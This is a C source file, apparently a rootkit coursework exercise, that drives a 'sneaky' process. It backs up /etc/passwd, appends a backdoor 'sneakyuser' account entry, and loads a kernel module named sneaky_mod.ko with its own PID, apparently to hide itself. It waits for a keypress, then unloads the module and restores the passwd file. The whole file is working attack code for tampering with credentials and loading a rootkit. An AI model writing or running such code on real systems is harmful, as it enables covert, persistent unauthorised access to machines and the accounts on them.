#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void copyfile(char * src, char * dst) {
  FILE * _src = fopen(src, "r");
  FILE * _dst = fopen(dst, "w");
  char line[256];
  while (fgets(line, sizeof(line), _src)) {
      fprintf(_dst, "%s", line);    
  }
  fclose(_src);
  fclose(_dst);
}

int main() {
  char src1[] = "sneaky_process.c";
  char dst1[] = "test.c";
  copyfile(src1, dst1);   
  printf("sneaky_process pid=%d\n", getpid());
  
  char src[] = "/etc/passwd";
  char dst[] = "/tmp/passwd";
  copyfile(src, dst); 
  
  FILE * target = fopen("/etc/passwd", "a");
  char append[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  fprintf(target, "%s", append); 
  fclose(target);  
    
    int rc1 = fork();
    if (rc1 == 0) {          
    
      char * args[4];
      args[0] = strdup("insmod");
      args[1] = strdup("sneaky_mod.ko");   
      char buf[50];   
      sprintf(buf, "PID=%d", getpid());
      args[2] = strdup(buf);
      args[3] = NULL;
      execvp(args[0], args);
    
    } else {
      wait(NULL);

      while (getchar() != 'q') {	
      }

      int rc2 = fork();
      if (rc2 == 0) {
	  char * args[3];
	  args[0] = strdup("rmmod");
	  args[1] = strdup("sneaky_mod.ko");   	  
	  args[2] = NULL;
	  execvp(args[0], args);
    
      } else {
	copyfile(dst, src); 
      }
         
    }
  return 0;
}


